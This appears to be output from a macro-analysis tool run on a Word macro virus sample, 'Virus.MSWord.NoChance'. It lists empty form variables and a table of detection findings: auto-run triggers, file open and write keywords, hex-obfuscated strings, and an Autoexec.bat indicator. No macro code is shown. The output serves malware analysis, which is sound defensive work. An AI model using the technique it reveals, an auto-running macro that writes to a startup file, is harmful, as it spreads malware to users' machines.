- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

